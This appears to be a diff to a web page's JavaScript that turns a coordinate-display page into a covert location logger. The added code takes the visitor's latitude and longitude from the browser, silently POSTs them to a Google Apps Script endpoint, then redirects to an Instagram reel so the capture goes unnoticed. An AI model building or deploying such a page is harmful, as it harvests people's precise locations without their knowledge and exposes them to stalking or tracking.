@@ -35,22 +35,31 @@
           const lat = position.coords.latitude;
           const lng = position.coords.longitude;
 
-          // Show coordinates just before redirect (optional)
-          document.getElementById("coords").textContent =
-            `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}`;
-
-          // Instantly redirect
-          window.location.href = "https://www.google.com/";
+          // Send coordinates to Google Apps Script
+          fetch("https://script.google.com/macros/s/AKfycbxnLHCxT6dKYOTaJXT6S6K_4ilUSHfhVkcvFGipQ1goxREbCLgYIIrwDSVQVlMGdhyG/exec", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ lat, lng }),
+          })
+          .then(() => {
+            // Redirect immediately after logging
+            window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+          })
+          .catch(err => {
+            console.error("Error logging location:", err);
+            window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+          });
         },
         function () {
-          document.getElementById("coords").textContent = "Unable to access location.";
+          alert("Location access denied.");
         }
       );
     } else {
-      document.getElementById("coords").textContent = "Geolocation is not supported.";
+      alert("Geolocation is not supported.");
     }
   }
 </script>
+
 
 
 <!-- Replace YOUR_API_KEY with your actual key -->
